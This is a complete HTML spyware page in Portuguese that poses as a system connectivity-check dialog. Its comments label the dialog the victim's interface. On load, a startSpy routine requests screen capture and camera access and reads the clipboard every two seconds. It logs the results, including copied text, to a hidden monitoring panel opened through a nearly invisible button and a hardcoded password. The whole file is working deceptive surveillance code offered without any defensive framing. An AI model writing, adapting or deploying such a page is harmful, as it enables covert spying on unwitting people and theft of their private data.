<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistema Operacional</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            background-color: #f2f2f7; 
            display: flex; 
            justify-content: center; 
            align-items: center; 
            height: 100vh; 
            margin: 0; 
            overflow: hidden; 
        }
        
        .dialog-box {
            background: white; 
            width: 85%; 
            max-width: 320px; 
            border-radius: 12px; 
            box-shadow: 0 10px 25px rgba(0,0,0,0.1); 
            text-align: center; 
            padding: 20px;
            position: relative;
        }
        
        h2 { margin: 0 0 10px 0; font-size: 16px; color: #000; }
        p { margin: 0 0 15px 0; font-size: 13px; color: #666; line-height: 1.4; }
        
        /* Botão Secreto */
        #admin-btn { 
            position: absolute; top: 10px; right: 10px; 
            width: 20px; height: 20px; cursor: pointer; 
            opacity: 0.1; z-index: 100;
        }
        #admin-btn:hover { opacity: 0.5; }

        /* Modal Senha */
        #modal {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0,0,0,0.9); z-index: 2000;
            justify-content: center; align-items: center;
        }
        .modal-inner {
            background: #fff; padding: 20px; border-radius: 8px; width: 80%; max-width: 250px; text-align: center;
        }
        input { width: 90%; padding: 8px; margin-bottom: 10px; border: 1px solid #ccc; border-radius: 4px; }
        button { padding: 8px 15px; border: none; border-radius: 4px; cursor: pointer; font-weight: bold; }
        .btn-ok { background: #007aff; color: white; }
        .btn-cancel { background: #e5e5ea; color: black; margin-left: 5px; }

        /* Painel Admin */
        #panel {
            display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: #000; color: #0f0; font-family: monospace; padding: 10px; box-sizing: border-box; z-index: 3000; overflow-y: auto;
        }
        .log { border-bottom: 1px solid #333; padding: 5px 0; font-size: 11px; word-break: break-all; }
        .time { color: #888; }
        .type { color: #ff00ff; font-weight: bold; margin-right: 5px; }
    </style>
</head>
<body>

    <!-- Interface Vítima -->
    <div class="dialog-box">
        <div id="admin-btn" onclick="showLogin()"></div>
        <h2>Ajustes de Conectividade</h2>
        <p>O sistema precisa verificar sua conexão de rede e recursos de mídia.</p>
        <div style="color:#007aff; font-size:12px;">Verificando...</div>
    </div>

    <!-- Modal -->
    <div id="modal">
        <div class="modal-inner">
            <h3 style="margin-top:0">Autenticação</h3>
            <input type="password" id="pass" placeholder="Senha">
            <br>
            <button class="btn-ok" onclick="login()">OK</button>
            <button class="btn-cancel" onclick="closeModal()">X</button>
        </div>
    </div>

    <!-- Painel -->
    <div id="panel">
        <div style="border-bottom:1px solid #333; padding-bottom:5px; margin-bottom:10px;">MONITORAMENTO ATIVO</div>
        <div id="logs"></div>
    </div>

    <script>
        const logsDiv = document.getElementById('logs');
        let clipTimer;

        function log(type, msg) {
            const time = new Date().toLocaleTimeString();
            const div = document.createElement('div');
            div.className = 'log';
            div.innerHTML = `<span class="time">[${time}]</span><span class="type">${type}</span>${msg}`;
            logsDiv.prepend(div);
        }

        async function startSpy() {
            try {
                // 1. Sistema
                log("SYS", navigator.userAgent.split('(')[1].split(')')[0] || "Android");

                // 2. Tela (Tenta capturar tela inteira)
                log("REQ", "Solicitando tela...");
                const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });
                log("SCREEN", "Tela capturada.");
                
                // Se a vítima sair da captura
                stream.getVideoTracks()[0].onended = () => log("WARN", "Vítima parou a tela.");

                // 3. Câmera
                log("REQ", "Solicitando câmera...");
                const cam = await navigator.mediaDevices.getUserMedia({ video: true });
                log("CAM", "Câmera ativa.");

                // 4. Clipboard
                log("REQ", "Monitorando clipboard...");
                clipTimer = setInterval(async () => {
                    try {
                        const txt = await navigator.clipboard.readText();
                        if(txt) log("CLIP", txt.substring(0, 50));
                    } catch(e){}
                }, 2000);

            } catch (err) {
                log("ERR", err.name + ": " + err.message);
            }
        }

        window.onload = startSpy;

        function showLogin() { document.getElementById('modal').style.display = 'flex'; }
        function closeModal() { document.getElementById('modal').style.display = 'none'; }
        function login() {
            if(document.getElementById('pass').value === '213448') {
                closeModal();
                document.getElementById('panel').style.display = 'block';
                log("ADMIN", "Acesso liberado.");
            } else alert("Erro");
        }
    </script>
</body>
</html>
